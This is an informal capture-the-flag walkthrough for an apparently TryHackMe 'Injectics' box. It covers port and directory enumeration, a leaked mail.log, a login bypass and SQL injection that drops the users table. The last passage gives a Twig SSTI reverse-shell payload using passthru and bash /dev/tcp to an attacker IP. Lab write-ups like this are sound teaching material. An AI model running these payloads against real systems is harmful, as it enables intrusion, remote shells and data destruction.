Started with a nmap scan
```
22 OpenSSH 8.2p1
80 Apache 2.4.41
```
When looking at the source for the webpage I found a email `dev@injectics.thm` and something that says Mails are stored in `mail.log` file looking at this file there are 2 logins but they dont work on the both login pages
```
superadmin@injectics.thm : superS..........
dev@injectis.thm : devP....
```
And looking more at the site all the webpages are static but the login pages looking at the login page there is a `script,js` file that has some login stuff in it and has a basic blacklist for what looks like sql injections the admin login page does not seem to have this `script.js `file 
Starting a gobuster scan
```
/index.php
/login.php
/mail.log
/flags
/css
/js
/javascript
/logout.php
/vendor
/script.js
dashboard.php
/functions.php
/phpmyadmin
/adminLogin007.php
/conn.php
/composer.json
```
Going to the composer file says its running `twig 2.14.0` and going to phpMyAdmin we have version `4.9.5deb2`  I tested both login forums with sqlmap and it did not get anything buy did say there might  be a false positive so I opened burp and used intruder and url encoded all characters to see if they changed anything and there is some payloads in a login bypass from hacktricks and switched to ffuf and then take the payload to burp and we can login into the app and now edit all the medals we know we need to drop the users table from the note we saw so I ran this command in the gold section `;drop table users -- -` and then it says the user table is now gone and give it 1-2 minutes and then it will be restored and now we can log out of the dev account and log into the dev account on the admin side and the only difference now is we have access to the profile section and we have ssti in the first name field using this payload `{{7*7}}` after a little bit of messing with commands we found we can use sort and passthru using this command we can get a rev shell `{{ ["bash -c 'exec bash -i >& /dev/tcp/10.13.8.255/4445 0>&1'", ""] | sort ('passthru')}}` and we can see what's in the flags folder 